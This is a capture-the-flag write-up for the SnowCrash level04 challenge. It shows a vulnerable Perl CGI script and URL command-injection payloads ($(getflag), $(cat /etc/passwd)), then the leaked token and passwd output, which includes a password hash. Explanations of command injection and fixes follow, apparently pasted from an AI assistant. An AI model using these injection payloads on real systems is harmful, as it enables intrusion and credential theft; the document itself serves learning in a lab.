# level04

level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));


=> a CGI perl at port 4747

http://192.168.182.137:4747/level04.pl?x=$(getflag)

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

http://192.168.182.137:4747/level04.pl?x=$(ls)

give us:

level04.pl


http://192.168.182.137:4747/level04.pl?x=$(cat%20/etc/passwd)

give us:

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:106::/var/run/dbus:/bin/false whoopsie:x:103:107::/nonexistent:/bin/false landscape:x:104:110::/var/lib/landscape:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin level00:x:2000:2000::/home/user/level00:/bin/bash level01:x:2001:2001::/home/user/level01:/bin/bash level02:x:2002:2002::/home/user/level02:/bin/bash level03:x:2003:2003::/home/user/level03:/bin/bash level04:x:2004:2004::/home/user/level04:/bin/bash level05:x:2005:2005::/home/user/level05:/bin/bash level06:x:2006:2006::/home/user/level06:/bin/bash level07:x:2007:2007::/home/user/level07:/bin/bash level08:x:2008:2008::/home/user/level08:/bin/bash level09:x:2009:2009::/home/user/level09:/bin/bash level10:x:2010:2010::/home/user/level10:/bin/bash level11:x:2011:2011::/home/user/level11:/bin/bash level12:x:2012:2012::/home/user/level12:/bin/bash level13:x:2013:2013::/home/user/level13:/bin/bash level14:x:2014:2014::/home/user/level14:/bin/bash flag00:x:3000:3000::/home/flag/flag00:/bin/bash flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash flag02:x:3002:3002::/home/flag/flag02:/bin/bash flag03:x:3003:3003::/home/flag/flag03:/bin/bash flag04:x:3004:3004::/home/flag/flag04:/bin/bash flag05:x:3005:3005::/home/flag/flag05:/bin/bash flag06:x:3006:3006::/home/flag/flag06:/bin/bash flag07:x:3007:3007::/home/flag/flag07:/bin/bash flag08:x:3008:3008::/home/flag/flag08:/bin/bash flag09:x:3009:3009::/home/flag/flag09:/bin/bash flag10:x:3010:3010::/home/flag/flag10:/bin/bash flag11:x:3011:3011::/home/flag/flag11:/bin/bash flag12:x:3012:3012::/home/flag/flag12:/bin/bash flag13:x:3013:3013::/home/flag/flag13:/bin/bash flag14:x:3014:3014::/home/flag/flag14:/bin/bash


## Explaination


This Perl script is a simple **CGI (Common Gateway Interface)** web script that accepts an input parameter via HTTP and executes it as a shell command. Here's a line-by-line breakdown:

---

### The Code

```perl
#!/usr/bin/perl
```

* Shebang line: Specifies the script should be run using the Perl interpreter.

```perl
# localhost:4747
```

* A comment, possibly noting that the web server is accessible on port 4747 (could be running locally).

```perl
use CGI qw{param};
```

* Imports the `param` function from Perl’s CGI module. `param("x")` fetches the value of the GET/POST parameter named `x`.

```perl
print "Content-type: text/html\n\n";
```

* Prints the HTTP content-type header for HTML, required for CGI output to be recognized properly by a web browser.

```perl
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
```

* Defines a subroutine `x` that:

  * Takes one argument (via `$_[0]`).
  * Stores it in `$y`.
  * Executes a shell command: `` `echo $y 2>&1` ``, where backticks run a shell command in Perl.
  * Prints the output.

```perl
x(param("x"));
```

* Calls the `x` subroutine with the value of the HTTP parameter `x`.

---

### Security Implication (Command Injection)

This code is **highly vulnerable** to **command injection**, because it executes unfiltered user input directly in the shell. For example:

```
http://localhost:4747/?x=hello;ls
```

Would execute:

```bash
echo hello;ls 2>&1
```

Which prints “hello” and then lists the current directory.

More dangerously:

```
http://localhost:4747/?x=hello;cat /etc/passwd
```

Would print the contents of `/etc/passwd`.

---

### Summary

This script:

* Runs a web service on port 4747,
* Takes a parameter `x`,
* Executes `echo $x` via a shell, and
* Prints the output.

It is **unsafe** and should not be used in production without **sanitizing** input or avoiding shell execution entirely.



This code is **vulnerable to command injection attacks** due to how it handles user input. Here's exactly **what makes it insecure**:

---

### 🔥 1. **Direct Execution of User Input in Shell**

```perl
print `echo $y 2>&1`;
```

* The backticks (`` `...` ``) in Perl run the enclosed string as a shell command.
* `$y` contains **raw user input** (from the web via `param("x")`).
* The user **fully controls** the string being executed by the shell.
* There's **no sanitization, escaping, or validation** of that input.

---

### ❗ 2. **Shell Interpretation Allows Arbitrary Commands**

Shells (like Bash) interpret special characters:

* `;` to separate commands,
* `|`, `&&`, `||`, `>`, `<`, etc.

So a request like:

```
http://localhost:4747/?x=hello;cat%20/etc/passwd
```

gets interpreted by the shell as:

```bash
echo hello;cat /etc/passwd
```

Which:

1. Prints "hello"
2. Then prints the contents of `/etc/passwd`

---

### ⚠️ 3. **No Input Validation**

```perl
$y = $_[0];
```

* This takes user input directly without checking for:

  * Disallowed characters
  * Expected formats (e.g., alphanumeric only)
  * Length limits
  * Escaping shell metacharacters

---

### 💡 Summary of What Makes It Vulnerable

| Problem                             | Description                                                                                          |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **User input passed to shell**      | The script uses backticks to run shell commands containing untrusted input.                          |
| **No sanitization or escaping**     | Special shell characters can be used to run arbitrary commands.                                      |
| **Runs with web server privileges** | If the CGI runs as `www-data` or another system user, it may have access to local files or commands. |

---

### 🛡️ How to Fix It

* **Avoid using backticks or `system` with user input.**
* **Use Perl's safer alternatives**, like the `IPC::Run` or `open3` modules with proper argument handling.
* **Sanitize input** using regular expressions or allowlists:

  ```perl
  $input =~ /^[a-zA-Z0-9]+$/ or die "Invalid input!";
  ```
* **Escape or reject** shell metacharacters.

---

Let me know if you'd like a secure rewrite of the script.



Great question.

The reason `getflag` must be in `$(...)` in your URL:

```
http://192.168.182.137:4747/level04.pl?x=$(getflag)
```

is because `$(...)` is **command substitution syntax** in Unix shells. It tells the shell:
**“Execute this command and substitute its output right here.”**

---

### 🔍 Let’s break it down:

In your vulnerable Perl script:

```perl
print `echo $y 2>&1`;
```

If the `x` parameter is `$(getflag)`, then:

```bash
echo $(getflag) 2>&1
```

is what the shell sees. The shell first **executes `getflag`**, captures its output (e.g., `FLAG-abc123`), and substitutes it into the `echo` command:

```bash
echo FLAG-abc123
```

So the script prints the flag.

---

### ❓ What if you just passed `getflag` without `$()`?

Like this:

```
http://192.168.182.137:4747/level04.pl?x=getflag
```

Then you'd get:

```bash
echo getflag
```

Which just prints:

```
getflag
```

It doesn't **run** the `getflag` command — it just echoes the literal word “getflag”.

---

### 🧠 Why `$()` Works

The `$()` tells the shell:

* Run `getflag`
* Capture its output
* Insert it into the command string

It's equivalent to the older backtick form:

```bash
echo `getflag`
```

Both do the same thing — run `getflag` and echo its result.

---

### ✅ Final Summary

| Input            | Shell Interprets As | Result                               |
| ---------------- | ------------------- | ------------------------------------ |
| `x=getflag`      | `echo getflag`      | Just prints "getflag"                |
| `x=$(getflag)`   | `echo FLAG-xyz`     | Executes `getflag`, prints flag      |
| `x=\`getflag\`\` | `echo FLAG-xyz`     | Also executes `getflag`, prints flag |

So, **you need `$()` (or backticks) to execute `getflag` and see the result**, not just echo the command name.

Let me know if you want to explore more tricks like this — or how to secure against them.
